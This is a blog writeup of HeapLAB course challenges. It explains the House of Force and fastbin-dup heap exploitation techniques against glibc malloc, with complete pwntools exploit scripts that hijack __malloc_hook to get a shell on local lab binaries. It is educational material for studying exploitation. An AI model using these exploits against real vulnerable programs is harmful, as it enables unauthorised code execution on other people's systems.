<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://feyor.sh/writeups/heaplab/">Original</a>
    <h1>HeapLAB</h1>
    
    <div id="readability-page-1" class="page"><div>
  
<!--endtoc-->
<p>Below are some of my notes and challenge writeups for Max Kamper’s excellent <a href="https://www.udemy.com/course/linux-heap-exploitation-part-1/">HeapLAB course</a>.</p>
<p><em>This page will be updated with more challenges in the future.</em></p>
<h2 id="house-of-force">House of Force</h2>
<p>This technique comes from Phantasmal Phantasmagoria’s <a href="http://seclists.org/bugtraq/2005/Oct/0118.html%20">Malloc Maleficarum</a>, one of the most seminal early works in pwning Glibc malloc (and the reason so many heap exploits are called “House of XYZ”).</p>
<p>In Glibc, malloc requests for memory are serviced from the top chunk (aka the wilderness).
Because heap metadata is stored in-line (the size of a chunk occupies the first 8 bytes of every chunk, just before the address returned from <kbd>malloc</kbd>), if we have a heap overflow we can clobber this metadata and create a huge top chunk; so huge in fact that it wraps around the virtual address space to an address before the start of the top chunk.
Then we can request a massive chunk from malloc that stops just short of our target address such that the first 8 bytes of the (new) top chunk reside at the target address.
Use the same heap overflow as before and we’ve overwritten the target value!</p>
<h3 id="solve">Solve</h3>
<p>The vulnerability in this binary is that <kbd>read</kbd> uses the size of the <em>chunk</em> (returned by <kbd>malloc_usable_size</kbd>), not the size of the user’s data, resulting in an 8 byte overflow if we request <code>CHUNK_SIZE-8</code> bytes from malloc (this is the maximum size of <em>user</em> data that can fit in a chunk of size <code>CHUNK_SIZE</code>).</p>





  
  
    

  
  
    







<details open="">
  <summary>Python</summary>
  <div><pre tabindex="0"><code data-lang="python"><span><span><span>from</span> pwn <span>import</span> <span>*</span>
</span></span><span><span>
</span></span><span><span>context<span>.</span>log_level <span>=</span> <span>&#39;warning&#39;</span>
</span></span><span><span>
</span></span><span><span>elf <span>=</span> context<span>.</span>binary <span>=</span> ELF(<span>&#34;house_of_force&#34;</span>)
</span></span><span><span>libc <span>=</span> ELF(elf<span>.</span>runpath <span>+</span> <span>b</span><span>&#34;/libc.so.6&#34;</span>)
</span></span><span><span>
</span></span><span><span><span>def</span> <span>malloc</span>(size, data):
</span></span><span><span>    proc<span>.</span>send(<span>b</span><span>&#34;1&#34;</span>)
</span></span><span><span>    proc<span>.</span>sendafter(<span>b</span><span>&#34;size: &#34;</span>, <span>f</span><span>&#34;</span><span>{</span>size<span>}</span><span>&#34;</span><span>.</span>encode())
</span></span><span><span>    proc<span>.</span>sendafter(<span>b</span><span>&#34;data: &#34;</span>, data)
</span></span><span><span>    proc<span>.</span>recvuntil(<span>b</span><span>&#34;&gt; &#34;</span>)
</span></span><span><span>
</span></span><span><span>proc <span>=</span> remote(<span>&#34;localhost&#34;</span>, <span>1337</span>)
</span></span><span><span>
</span></span><span><span>proc<span>.</span>recvuntil(<span>b</span><span>&#34;puts() @ &#34;</span>)
</span></span><span><span>libc<span>.</span>address <span>=</span> <span>int</span>(proc<span>.</span>recvline(), <span>16</span>) <span>-</span> libc<span>.</span>sym<span>.</span>puts
</span></span><span><span>
</span></span><span><span>proc<span>.</span>recvuntil(<span>b</span><span>&#34;heap @ &#34;</span>)
</span></span><span><span>heap <span>=</span> <span>int</span>(proc<span>.</span>recvline(), <span>16</span>)
</span></span><span><span>proc<span>.</span>recvuntil(<span>b</span><span>&#34;&gt; &#34;</span>)
</span></span><span><span>
</span></span><span><span>info(<span>f</span><span>&#34;heap: 0x</span><span>{</span>heap<span>:</span><span>02x</span><span>}</span><span>&#34;</span>)
</span></span><span><span>proc<span>.</span>timeout <span>=</span> <span>0.5</span>
</span></span><span><span>
</span></span><span><span>malloc(<span>0x20</span><span>-</span><span>8</span>, <span>b</span><span>&#34;A&#34;</span><span>*</span>(<span>0x20</span><span>-</span><span>8</span>) <span>+</span> p64(<span>0xffffffffffffffff</span>))
</span></span><span><span><span># we&#39;re calculating the distance between the end of the previous chunk and the address exactly one chunk away (0x20 bytes) from __malloc_hook, so that the next chunk we allocate will overwrite __malloc_hook</span>
</span></span><span><span><span># also we have a heap leak so put /bin/sh on the heap</span>
</span></span><span><span>malloc((libc<span>.</span>sym<span>.</span>__malloc_hook<span>-</span><span>0x20</span>) <span>-</span> (heap<span>+</span><span>0x20</span>), <span>b</span><span>&#34;/bin/sh</span><span>\x00</span><span>&#34;</span>)
</span></span><span><span>malloc(<span>0x20</span><span>-</span><span>8</span>, p64(libc<span>.</span>sym<span>.</span>system))
</span></span><span><span><span># the size of the chunk gets passed to __malloc_hook, so we will allocate &amp;&#34;/bin/sh\x00&#34; bytes</span>
</span></span><span><span>malloc(heap<span>+</span><span>0x20</span><span>+</span><span>0x8</span><span>+</span><span>0x8</span>, <span>b</span><span>&#34;&#34;</span>)
</span></span><span><span>
</span></span><span><span>proc<span>.</span>sendline(<span>b</span><span>&#34;id&#34;</span>)
</span></span><span><span><span>print</span>(proc<span>.</span>recvall(timeout<span>=</span><span>0.1</span>))</span></span></code></pre></div>
</details>






  
  
    

  
  
    







<div><pre tabindex="0"><code data-lang="text"><span><span>b&#39;uid=1000(pwny) gid=100(users) groups=100(users),1(wheel)\n&#39;</span></span></code></pre></div>

<h2 id="fastbin-dup">Fastbin dup</h2>
<p>This time the vuln is a nice and simple double free: <kbd>free</kbd> doesn’t check if an index was previously freed, so we can free a previously <kbd>malloc</kbd>​ed chunk as many times as we want.</p>
<p>Before we move on let’s talk about in-band (stored on the heap) vs out-of-band (stored somewhere besides the heap) heap metadata.
We saw previously that the size of a chunk is stored in the chunk itself, but how does <kbd>malloc</kbd> know where e.g. the top chunk is in order to service a request?
A heap arena is a data structure that does all of the necessary bookkeeping for the heap, or more accurately <em>a</em> heap.
When a program has multiple threads, it would be inefficient to have to contend for a lock for every allocation/free, so each thread (up to a limit) gets their own slice of the heap (the section of program memory) governed by their own heap arena.</p>





  
  
    

  
  
    







<details open="">
  <summary>C</summary>
  <div><div>
<table><tbody><tr><td>
<pre tabindex="0"><code><span id="org-coderef--cce405-1655"><a href="#org-coderef--cce405-1655">1655</a>
</span><span id="org-coderef--cce405-1656"><a href="#org-coderef--cce405-1656">1656</a>
</span><span id="org-coderef--cce405-1657"><a href="#org-coderef--cce405-1657">1657</a>
</span><span id="org-coderef--cce405-1658"><a href="#org-coderef--cce405-1658">1658</a>
</span><span id="org-coderef--cce405-1659"><a href="#org-coderef--cce405-1659">1659</a>
</span><span id="org-coderef--cce405-1660"><a href="#org-coderef--cce405-1660">1660</a>
</span><span id="org-coderef--cce405-1661"><a href="#org-coderef--cce405-1661">1661</a>
</span><span id="org-coderef--cce405-1662"><a href="#org-coderef--cce405-1662">1662</a>
</span><span id="org-coderef--cce405-1663"><a href="#org-coderef--cce405-1663">1663</a>
</span><span id="org-coderef--cce405-1664"><a href="#org-coderef--cce405-1664">1664</a>
</span><span id="org-coderef--cce405-1665"><a href="#org-coderef--cce405-1665">1665</a>
</span><span id="org-coderef--cce405-1666"><a href="#org-coderef--cce405-1666">1666</a>
</span><span id="org-coderef--cce405-1667"><a href="#org-coderef--cce405-1667">1667</a>
</span><span id="org-coderef--cce405-1668"><a href="#org-coderef--cce405-1668">1668</a>
</span><span id="org-coderef--cce405-1669"><a href="#org-coderef--cce405-1669">1669</a>
</span><span id="org-coderef--cce405-1670"><a href="#org-coderef--cce405-1670">1670</a>
</span><span id="org-coderef--cce405-1671"><a href="#org-coderef--cce405-1671">1671</a>
</span><span id="org-coderef--cce405-1672"><a href="#org-coderef--cce405-1672">1672</a>
</span><span id="org-coderef--cce405-1673"><a href="#org-coderef--cce405-1673">1673</a>
</span><span id="org-coderef--cce405-1674"><a href="#org-coderef--cce405-1674">1674</a>
</span><span id="org-coderef--cce405-1675"><a href="#org-coderef--cce405-1675">1675</a>
</span><span id="org-coderef--cce405-1676"><a href="#org-coderef--cce405-1676">1676</a>
</span><span id="org-coderef--cce405-1677"><a href="#org-coderef--cce405-1677">1677</a>
</span><span id="org-coderef--cce405-1678"><a href="#org-coderef--cce405-1678">1678</a>
</span><span id="org-coderef--cce405-1679"><a href="#org-coderef--cce405-1679">1679</a>
</span><span id="org-coderef--cce405-1680"><a href="#org-coderef--cce405-1680">1680</a>
</span><span id="org-coderef--cce405-1681"><a href="#org-coderef--cce405-1681">1681</a>
</span><span id="org-coderef--cce405-1682"><a href="#org-coderef--cce405-1682">1682</a>
</span><span id="org-coderef--cce405-1683"><a href="#org-coderef--cce405-1683">1683</a>
</span><span id="org-coderef--cce405-1684"><a href="#org-coderef--cce405-1684">1684</a>
</span><span id="org-coderef--cce405-1685"><a href="#org-coderef--cce405-1685">1685</a>
</span><span id="org-coderef--cce405-1686"><a href="#org-coderef--cce405-1686">1686</a>
</span><span id="org-coderef--cce405-1687"><a href="#org-coderef--cce405-1687">1687</a>
</span><span id="org-coderef--cce405-1688"><a href="#org-coderef--cce405-1688">1688</a>
</span><span id="org-coderef--cce405-1689"><a href="#org-coderef--cce405-1689">1689</a>
</span><span id="org-coderef--cce405-1690"><a href="#org-coderef--cce405-1690">1690</a>
</span><span id="org-coderef--cce405-1691"><a href="#org-coderef--cce405-1691">1691</a>
</span><span id="org-coderef--cce405-1692"><a href="#org-coderef--cce405-1692">1692</a>
</span><span id="org-coderef--cce405-1693"><a href="#org-coderef--cce405-1693">1693</a>
</span><span id="org-coderef--cce405-1694"><a href="#org-coderef--cce405-1694">1694</a>
</span><span id="org-coderef--cce405-1695"><a href="#org-coderef--cce405-1695">1695</a>
</span><span id="org-coderef--cce405-1696"><a href="#org-coderef--cce405-1696">1696</a>
</span><span id="org-coderef--cce405-1697"><a href="#org-coderef--cce405-1697">1697</a>
</span></code></pre></td>
<td>
<pre tabindex="0"><code data-lang="c"><span><span><span>struct</span> malloc_state
</span></span><span><span>{
</span></span><span><span>  <span>/* Serialize access.  */</span>
</span></span><span><span>  <span>__libc_lock_define</span> (, mutex);
</span></span><span><span>
</span></span><span><span>  <span>/* Flags (formerly in max_fast).  */</span>
</span></span><span><span>  <span>int</span> flags;
</span></span><span><span>
</span></span><span><span>  <span>/* Set if the fastbin chunks contain recently inserted free blocks.  */</span>
</span></span><span><span>  <span>/* Note this is a bool but not all targets support atomics on booleans.  */</span>
</span></span><span><span>  <span>int</span> have_fastchunks;
</span></span><span><span>
</span></span><span><span>  <span>/* Fastbins */</span>
</span></span><span><span>  mfastbinptr fastbinsY[NFASTBINS];
</span></span><span><span>
</span></span><span><span>  <span>/* Base of the topmost chunk -- not otherwise kept in a bin */</span>
</span></span><span><span>  mchunkptr top;
</span></span><span><span>
</span></span><span><span>  <span>/* The remainder from the most recent split of a small request */</span>
</span></span><span><span>  mchunkptr last_remainder;
</span></span><span><span>
</span></span><span><span>  <span>/* Normal bins packed as described above */</span>
</span></span><span><span>  mchunkptr bins[NBINS <span>*</span> <span>2</span> <span>-</span> <span>2</span>];
</span></span><span><span>
</span></span><span><span>  <span>/* Bitmap of bins */</span>
</span></span><span><span>  <span>unsigned</span> <span>int</span> binmap[BINMAPSIZE];
</span></span><span><span>
</span></span><span><span>  <span>/* Linked list */</span>
</span></span><span><span>  <span>struct</span> malloc_state <span>*</span>next;
</span></span><span><span>
</span></span><span><span>  <span>/* Linked list for free arenas.  Access to this field is serialized
</span></span></span><span><span><span>     by free_list_lock in arena.c.  */</span>
</span></span><span><span>  <span>struct</span> malloc_state <span>*</span>next_free;
</span></span><span><span>
</span></span><span><span>  <span>/* Number of threads attached to this arena.  0 if the arena is on
</span></span></span><span><span><span>     the free list.  Access to this field is serialized by
</span></span></span><span><span><span>     free_list_lock in arena.c.  */</span>
</span></span><span><span>  INTERNAL_SIZE_T attached_threads;
</span></span><span><span>
</span></span><span><span>  <span>/* Memory allocated from the system in this arena.  */</span>
</span></span><span><span>  INTERNAL_SIZE_T system_mem;
</span></span><span><span>  INTERNAL_SIZE_T max_system_mem;
</span></span><span><span>};</span></span></code></pre></td></tr></tbody></table>
</div>
</div>
</details>

<p>The important bit of metadata we care about here are the <a href="#org-coderef--cce405-1668">fastbins</a>.
As an optimization for small (and therefore frequent) allocations, for chunk sizes within the first <code>NFASTBINS</code> multiples of the smallest chunk size, freeing a chunk of this size adds it to a corresponding singly linked list (and the heads of these linked lists are stored in <kbd>fastbinsY</kbd>).
And while the heads of the linked lists are stored in the arena, subsequent pointers are stored in-line in the chunks themselves, <span>overlapping with where user data normally goes</span>.</p>
<p>I like to think of a chunk like this:</p>





  
  
    
    
    
  
  
    

  
  
    




  




<details open="">
  <summary>C</summary>
  <div><pre tabindex="0"><code data-lang="c"><span><span><span>struct</span> fastbin_chunk_0x20 {
</span></span><span><span>  <span>union</span> {
</span></span><span><span>    <span>struct</span> {
</span></span><span><span>      <span>size_t</span> _size : <span>61</span>;
</span></span><span><span>      <span>unsigned</span> <span>int</span> non_main_arena : <span>1</span>;
</span></span><span><span>      <span>unsigned</span> <span>int</span> is_mmapped : <span>1</span>;
</span></span><span><span>      <span>unsigned</span> <span>int</span> prev_inuse : <span>1</span>;
</span></span><span><span>    };
</span></span><span><span>    <span>size_t</span> size;
</span></span><span><span>  };
</span></span><span><span>  <span>union</span> {
</span></span><span><span>    <span>struct</span> {
</span></span><span><span>      fastbin_chunk_0x20<span>*</span> fd;
</span></span><span><span>      <span>char</span> _reserved[<span>0x20</span><span>-</span><span>8</span><span>-</span><span>8</span>];<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>
</span></span><span><span>    } free;
</span></span><span><span>    <span>struct</span> {
</span></span><span><span>      <span>char</span> data[<span>0x20</span><span>-</span><span>8</span>];
</span></span><span><span>    } inuse;
</span></span><span><span>  };
</span></span><span><span>};</span></span></code></pre></div>
</details>


<p>Combining this knowledge with our double free, we could free chunk A twice, causing it to be added to the corresonding fastbin freelist twice; then we could <kbd>malloc</kbd> chunk B of the same size as A, and the first 8 bytes of the user accessible data of chunk B that <kbd>malloc</kbd> returns will still be interpreted as a <kbd>fd</kbd> pointer for the <em>next</em> occurence of chunk A (the one that’s still in the freelist).
Then we could corrupt this <kbd>fd</kbd> pointer and when we allocate another chunk C, <kbd>malloc</kbd> will return a chunk at wherever the corrupted <kbd>fd</kbd> points.</p>
<p>As an additional complication, we can’t actually just allocate chunk A and then free it twice, because <kbd>malloc</kbd> checks if the chunk we’re adding to the freelist is the same chunk that’s at the head of the freelist:</p>





  
  
    

  
  
    







<details open="">
  <summary>C</summary>
  <div><div>
<table><tbody><tr><td>
<pre tabindex="0"><code><span>3592
</span><span>3593
</span><span>3594
</span></code></pre></td>
<td>
<pre tabindex="0"><code data-lang="c"><span><span><span>size_t</span> victim_idx <span>=</span> <span>fastbin_index</span> (<span>chunksize</span> (victim));
</span></span><span><span><span>if</span> (<span>__builtin_expect</span> (victim_idx <span>!=</span> idx, <span>0</span>))
</span></span><span><span>    <span>malloc_printerr</span> (<span>&#34;malloc(): memory corruption (fast)&#34;</span>);</span></span></code></pre></td></tr></tbody></table>
</div>
</div>
</details>

<p>This is trivially bypassed by freeing a different chunk in between the two <kbd>free</kbd>​s of chunk A.</p>
<h3 id="solve">Solve</h3>
<p>There are a few complications to address when actually writing the exploit.</p>
<p>We have a libc leak again so malloc hooks (particularly <kbd>__malloc_hook</kbd> and <kbd>__free_hook</kbd>) are viable targets.
However, because this time we’re allocating a fake chunk from a corrupted freelist pointer, the 16 bytes before our target must be valid metadata for a freed chunk.</p>
<p><kbd>__free_hook</kbd> is surrounded by zeroes so it’s a no-go, but <kbd>__malloc_hook</kbd> is a different story:</p>
<figure><img src="https://www.htmhell.dev/adventcalendar/2025/27/fastbin_dup-__malloc_hook.svg"/>
</figure>

<p>Instead of putzing around with finding a good alignment ourselves, we can let pwndbg do it for us:</p>
<figure><img src="https://www.htmhell.dev/adventcalendar/2025/27/fastbin_dup-find-fake-fast.svg"/>
</figure>

<p>But a size field of 0xf8 is larger than that of the largest chunk’s fastbin (0x80).
The values of <kbd>_IO_wide_data_0+240</kbd> differ between my aarch64-linux NixOS VM (running the binary with <a href="https://github.com/Feyorsh/pwnypus/blob/33a81c39391456e5ae9a8f70e1562d3dc2d39157/vm.nix">QEMU/Rosetta</a>) and the intended x86_64-linux Ubuntu VM, so this approach won’t work for my setup specifically.</p>
<p>The same is also true for trying FSOP, as we can’t create a fake chunk in <kbd>__GI__IO_file_jumps</kbd>.</p>
<p>We’ll soon discuss a very interesting method of using the fastbin dupe to corrupt <kbd>main_arena</kbd>’s top_chunk pointer, but that requires more allocations than the 7 we’re permitted here, so we’ll settle for overwriting the target for now.</p>





  
  
    

  
  
    







<details open="">
  <summary>Python</summary>
  <div><pre tabindex="0"><code data-lang="python"><span><span><span>from</span> pwn <span>import</span> <span>*</span>
</span></span><span><span>
</span></span><span><span>context<span>.</span>log_level <span>=</span> <span>&#39;warning&#39;</span>
</span></span><span><span>
</span></span><span><span>elf <span>=</span> context<span>.</span>binary <span>=</span> ELF(<span>&#34;fastbin_dup&#34;</span>)
</span></span><span><span>libc <span>=</span> ELF(elf<span>.</span>runpath <span>+</span> <span>b</span><span>&#34;/libc.so.6&#34;</span>)
</span></span><span><span>
</span></span><span><span><span>def</span> <span>malloc</span>(size, data):
</span></span><span><span>    proc<span>.</span>send(<span>b</span><span>&#34;1&#34;</span>)
</span></span><span><span>    proc<span>.</span>sendafter(<span>b</span><span>&#34;size: &#34;</span>, <span>f</span><span>&#34;</span><span>{</span>size<span>}</span><span>&#34;</span><span>.</span>encode())
</span></span><span><span>    proc<span>.</span>sendafter(<span>b</span><span>&#34;data: &#34;</span>, data)
</span></span><span><span>    proc<span>.</span>recvuntil(<span>b</span><span>&#34;&gt; &#34;</span>)
</span></span><span><span>
</span></span><span><span><span>def</span> <span>free</span>(index):
</span></span><span><span>    proc<span>.</span>send(<span>b</span><span>&#34;2&#34;</span>)
</span></span><span><span>    proc<span>.</span>sendafter(<span>b</span><span>&#34;index: &#34;</span>, <span>f</span><span>&#34;</span><span>{</span>index<span>}</span><span>&#34;</span><span>.</span>encode())
</span></span><span><span>    proc<span>.</span>recvuntil(<span>b</span><span>&#34;&gt; &#34;</span>)
</span></span><span><span>
</span></span><span><span>proc <span>=</span> remote(<span>&#34;localhost&#34;</span>, <span>1337</span>)
</span></span><span><span>
</span></span><span><span>proc<span>.</span>recvuntil(<span>b</span><span>&#34;puts() @ &#34;</span>)
</span></span><span><span>libc<span>.</span>address <span>=</span> <span>int</span>(proc<span>.</span>recvline(), <span>16</span>) <span>-</span> libc<span>.</span>sym<span>.</span>puts
</span></span><span><span>
</span></span><span><span>proc<span>.</span>sendafter(<span>b</span><span>&#34;Enter your username: &#34;</span>, p64(<span>0x20</span>))
</span></span><span><span>
</span></span><span><span>proc<span>.</span>recvuntil(<span>b</span><span>&#34;&gt; &#34;</span>)
</span></span><span><span>proc<span>.</span>timeout <span>=</span> <span>0.5</span>
</span></span><span><span>
</span></span><span><span>proc<span>.</span>send(<span>b</span><span>&#34;3&#34;</span>)
</span></span><span><span>proc<span>.</span>recvline()
</span></span><span><span><span>print</span>(proc<span>.</span>recvline())
</span></span><span><span>
</span></span><span><span><span># 0x20 freelist: NULL</span>
</span></span><span><span>malloc(<span>0x20</span><span>-</span><span>8</span>, <span>b</span><span>&#34;A&#34;</span>)
</span></span><span><span>malloc(<span>0x20</span><span>-</span><span>8</span>, <span>b</span><span>&#34;B&#34;</span>)
</span></span><span><span>free(<span>0</span>)
</span></span><span><span><span># 0x20 freelist: [chunk A] -&gt; NULL</span>
</span></span><span><span>free(<span>1</span>)
</span></span><span><span><span># 0x20 freelist: [chunk B] -&gt; [chunk A] -&gt; NULL</span>
</span></span><span><span>free(<span>0</span>)
</span></span><span><span><span># 0x20 freelist: [chunk A] -&gt; [chunk B] -&gt; [chunk A] -&gt; NULL</span>
</span></span><span><span>malloc(<span>0x20</span><span>-</span><span>8</span>, p64(elf<span>.</span>sym<span>.</span>user<span>-</span><span>8</span>)) <span># chunk C</span>
</span></span><span><span><span># 0x20 freelist: [chunk B] -&gt; [chunk A] -&gt; &amp;user</span>
</span></span><span><span>malloc(<span>0x20</span><span>-</span><span>8</span>, <span>b</span><span>&#34;D&#34;</span>)
</span></span><span><span><span># 0x20 freelist: [chunk A] -&gt; &amp;user</span>
</span></span><span><span>malloc(<span>0x20</span><span>-</span><span>8</span>, <span>b</span><span>&#34;E&#34;</span>)
</span></span><span><span><span># 0x20 freelist: &amp;user</span>
</span></span><span><span>malloc(<span>0x20</span><span>-</span><span>8</span>, <span>b</span><span>&#34;F&#34;</span><span>*</span><span>8</span> <span>+</span> <span>b</span><span>&#34;pwned&#34;</span>)
</span></span><span><span>
</span></span><span><span>proc<span>.</span>send(<span>b</span><span>&#34;3&#34;</span>)
</span></span><span><span>proc<span>.</span>recvline()
</span></span><span><span><span>print</span>(proc<span>.</span>recvline())</span></span></code></pre></div>
</details>






  
  
    

  
  
    







<div><pre tabindex="0"><code data-lang="text"><span><span>b&#39;target: XXXXXXX\n&#39;
</span></span><span><span>b&#39;target: pwnedXX\n&#39;</span></span></code></pre></div>

<h3 id="challenge-solve">Challenge solve</h3>
<p>So I hinted that there’s a way to corrupt <kbd>main_arena</kbd>’s top_chunk pointer to achieve a truly arbitrary write, and indeed we’ll do just that.</p>
<p>The basic idea is that we have an arbitrary write over the fastbin head pointers; most values don’t point to valid freed fastbin chunks and will therefore crash during the integrity checks when allocating from that fastbin, but what if we used that value to create a fake free fastbin cache inside <kbd>main_arena</kbd>?
Then we could use another fastbin dupe to clobber the <kbd>top</kbd> chunk pointer, which is convenient because allocations serviced from the top chunk are not subject to the same strict size integrity checks as fastbin chunks!</p>
<p>By settings the the <kbd>top</kbd> pointer to just before <kbd>__malloc_hook</kbd> (with some misalignment introduced to ensure the fake top chunk has a valid size field), we can jump to a one_gadget when we next call <kbd>malloc</kbd>:</p>





  
  
    

  
  
    







<details open="">
  <summary>Bash</summary>
  <div><pre tabindex="0"><code data-lang="bash"><span><span>one_gadget <span>$(</span>patchelf --print-rpath fastbin_dup_2<span>)</span>/libc.so.6</span></span></code></pre></div>
</details>






  
  
    

  
  
    







<div><pre tabindex="0"><code data-lang="text"><span><span>0xc4dbf execve(&#34;/bin/sh&#34;, r13, r12)
</span></span><span><span>constraints:
</span></span><span><span>  [r13] == NULL || r13 == NULL || r13 is a valid argv
</span></span><span><span>  [r12] == NULL || r12 == NULL || r12 is a valid envp
</span></span><span><span>
</span></span><span><span>0xc4ddf execve(&#34;/bin/sh&#34;, rbp-0x40, r12)
</span></span><span><span>constraints:
</span></span><span><span>  address rbp-0x38 is writable
</span></span><span><span>  rdi == NULL || {&#34;/bin/sh&#34;, rdi, NULL} is a valid argv
</span></span><span><span>  [r12] == NULL || r12 == NULL || r12 is a valid envp
</span></span><span><span>
</span></span><span><span>0xc4de6 execve(&#34;/bin/sh&#34;, rbp-0x40, r12)
</span></span><span><span>constraints:
</span></span><span><span>  address rbp-0x38 is writable
</span></span><span><span>  rax == NULL || {rax, rdi, NULL} is a valid argv
</span></span><span><span>  [r12] == NULL || r12 == NULL || r12 is a valid envp
</span></span><span><span>
</span></span><span><span>0xe1fa1 execve(&#34;/bin/sh&#34;, rsp+0x50, environ)
</span></span><span><span>constraints:
</span></span><span><span>  [rsp+0x50] == NULL || {[rsp+0x50], [rsp+0x58], [rsp+0x60], [rsp+0x68], ...} is a valid argv</span></span></code></pre></div>

<p>As it happens we control the contents of <code>[rsp+0x50]</code>, which we can set to a string that prevents further argument processing; <code>&#34;-s&#34;</code> does the trick for <kbd>dash</kbd>​/​<kbd>bash</kbd>.</p>





  
  
    

  
  
    







<details open="">
  <summary>Python</summary>
  <div><pre tabindex="0"><code data-lang="python"><span><span><span>from</span> pwn <span>import</span> <span>*</span>
</span></span><span><span>
</span></span><span><span>context<span>.</span>log_level <span>=</span> <span>&#39;warning&#39;</span>
</span></span><span><span>
</span></span><span><span>elf <span>=</span> context<span>.</span>binary <span>=</span> ELF(<span>&#34;fastbin_dup_2&#34;</span>)
</span></span><span><span>libc <span>=</span> ELF(elf<span>.</span>runpath <span>+</span> <span>b</span><span>&#34;/libc.so.6&#34;</span>)
</span></span><span><span>
</span></span><span><span><span>def</span> <span>malloc</span>(size, data):
</span></span><span><span>    proc<span>.</span>send(<span>b</span><span>&#34;1&#34;</span>)
</span></span><span><span>    proc<span>.</span>sendafter(<span>b</span><span>&#34;size: &#34;</span>, <span>f</span><span>&#34;</span><span>{</span>size<span>}</span><span>&#34;</span><span>.</span>encode())
</span></span><span><span>    proc<span>.</span>sendafter(<span>b</span><span>&#34;data: &#34;</span>, data)
</span></span><span><span>    proc<span>.</span>recvuntil(<span>b</span><span>&#34;&gt; &#34;</span>)
</span></span><span><span>
</span></span><span><span><span>def</span> <span>free</span>(index):
</span></span><span><span>    proc<span>.</span>send(<span>b</span><span>&#34;2&#34;</span>)
</span></span><span><span>    proc<span>.</span>sendafter(<span>b</span><span>&#34;index: &#34;</span>, <span>f</span><span>&#34;</span><span>{</span>index<span>}</span><span>&#34;</span><span>.</span>encode())
</span></span><span><span>    proc<span>.</span>recvuntil(<span>b</span><span>&#34;&gt; &#34;</span>)
</span></span><span><span>
</span></span><span><span>proc <span>=</span> remote(<span>&#34;localhost&#34;</span>, <span>1337</span>)
</span></span><span><span>
</span></span><span><span>proc<span>.</span>recvuntil(<span>b</span><span>&#34;puts() @ &#34;</span>)
</span></span><span><span>libc<span>.</span>address <span>=</span> <span>int</span>(proc<span>.</span>recvline(), <span>16</span>) <span>-</span> libc<span>.</span>sym<span>.</span>puts
</span></span><span><span>
</span></span><span><span>proc<span>.</span>recvuntil(<span>b</span><span>&#34;&gt; &#34;</span>)
</span></span><span><span>proc<span>.</span>timeout <span>=</span> <span>0.5</span>
</span></span><span><span>
</span></span><span><span>one_gadget <span>=</span> libc<span>.</span>address <span>+</span> <span>0xe1fa1</span>
</span></span><span><span>
</span></span><span><span><span># 0x80 freelist: NULL</span>
</span></span><span><span>malloc(<span>0x20</span><span>-</span><span>8</span>, <span>b</span><span>&#34;A&#34;</span>)
</span></span><span><span>malloc(<span>0x20</span><span>-</span><span>8</span>, <span>b</span><span>&#34;B&#34;</span>)
</span></span><span><span>free(<span>0</span>)
</span></span><span><span><span># 0x20 freelist: [chunk A] -&gt; NULL</span>
</span></span><span><span>free(<span>1</span>)
</span></span><span><span><span># 0x20 freelist: [chunk B] -&gt; [chunk A] -&gt; NULL</span>
</span></span><span><span>free(<span>0</span>)
</span></span><span><span><span># 0x20 freelist: [chunk A] -&gt; [chunk B] -&gt; [chunk A] -&gt; NULL</span>
</span></span><span><span>malloc(<span>0x20</span><span>-</span><span>8</span>, p64(<span>0x60</span>)) <span># chunk C</span>
</span></span><span><span><span># 0x20 freelist: [chunk B] -&gt; [chunk A] -&gt; 0x60</span>
</span></span><span><span>malloc(<span>0x20</span><span>-</span><span>8</span>, <span>b</span><span>&#34;D&#34;</span>)
</span></span><span><span><span># 0x20 freelist: [chunk A] -&gt; 0x60</span>
</span></span><span><span>malloc(<span>0x20</span><span>-</span><span>8</span>, <span>b</span><span>&#34;E&#34;</span>)
</span></span><span><span><span># 0x20 freelist: 0x60</span>
</span></span><span><span>
</span></span><span><span>malloc(<span>0x60</span><span>-</span><span>8</span>, <span>b</span><span>&#34;F&#34;</span>)
</span></span><span><span>malloc(<span>0x60</span><span>-</span><span>8</span>, <span>b</span><span>&#34;G&#34;</span>)
</span></span><span><span>free(<span>5</span>)
</span></span><span><span><span># 0x60 freelist: [chunk F] -&gt; NULL</span>
</span></span><span><span>free(<span>6</span>)
</span></span><span><span><span># 0x60 freelist: [chunk G] -&gt; [chunk F] -&gt; NULL</span>
</span></span><span><span>free(<span>5</span>)
</span></span><span><span><span># 0x60 freelist: [chunk F] -&gt; [chunk G] -&gt; [chunk F] -&gt; NULL</span>
</span></span><span><span>malloc(<span>0x60</span><span>-</span><span>8</span>, p64(libc<span>.</span>sym<span>.</span>main_arena<span>+</span><span>8</span>)) <span># chunk H</span>
</span></span><span><span><span># 0x60 freelist: [chunk F] -&gt; [chunk G] -&gt; &amp;main_arena</span>
</span></span><span><span>malloc(<span>0x60</span><span>-</span><span>8</span>, <span>b</span><span>&#34;-s</span><span>\x00</span><span>&#34;</span>) <span># chunk I, lives at rsp+0x50 when __malloc_hook is executed</span>
</span></span><span><span><span># 0x60 freelist: [chunk G] -&gt; &amp;main_arena</span>
</span></span><span><span>malloc(<span>0x60</span><span>-</span><span>8</span>, <span>b</span><span>&#34;J&#34;</span>)
</span></span><span><span><span># 0x60 freelist: &amp;main_arena</span>
</span></span><span><span>malloc(<span>0x60</span><span>-</span><span>8</span>, <span>b</span><span>&#34;</span><span>\x00</span><span>&#34;</span><span>*</span><span>0x48</span> <span>+</span> p64(libc<span>.</span>sym<span>.</span>__malloc_hook<span>-</span><span>0x1c</span><span>-</span><span>8</span>))
</span></span><span><span><span># main_arena.top_chunk = &amp;__malloc_hook-0x10</span>
</span></span><span><span>malloc(<span>0x80</span><span>-</span><span>8</span>, <span>b</span><span>&#34;L&#34;</span><span>*</span><span>20</span> <span>+</span> p64(one_gadget)) <span># chunk L</span>
</span></span><span><span><span># __malloc_hook = &amp;one_gadget</span>
</span></span><span><span>malloc(<span>0x2d</span>, <span>b</span><span>&#34;&#34;</span>) <span># chunk M</span>
</span></span><span><span><span># __malloc_hook triggered</span>
</span></span><span><span>
</span></span><span><span>proc<span>.</span>sendline(<span>&#34;id&#34;</span>)
</span></span><span><span><span>print</span>(proc<span>.</span>recvline())</span></span></code></pre></div>
